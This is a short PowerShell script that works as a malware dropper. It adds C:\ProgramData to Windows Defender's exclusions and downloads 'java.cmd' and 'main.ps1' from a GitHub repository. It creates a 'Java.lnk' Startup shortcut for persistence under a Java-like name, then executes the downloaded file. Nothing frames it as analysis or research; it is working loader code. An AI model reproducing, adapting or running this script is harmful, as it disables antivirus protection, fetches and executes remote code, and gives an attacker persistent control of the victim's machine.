Set-MpPreference -ExclusionPath C:\ProgramData
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$down = New-Object System.Net.WebClient
$url = 'https://github.com/qwertyuiopindia/log/raw/main/java.cmd?raw=true'
$file = "C:\ProgramData\java.cmd"
$down.DownloadFile($url,$file)
$objShell = New-Object -ComObject ("WScript.Shell")
$objShortCut = $objShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" + "\Java.lnk")
$objShortCut.TargetPath="C:\ProgramData\java.cmd"
$objShortCut.Save()
$down = New-Object System.Net.WebClient
$url2 = 'https://github.com/qwertyuiopindia/log/raw/main/main.ps1?raw=true'
$file2 = "C:\ProgramData\main.ps1"
$down.DownloadFile($url2,$file2)
$file = "C:\ProgramData\java.cmd"
$exec = New-Object -com shell.application
$exec.shellexecute($file)
exit

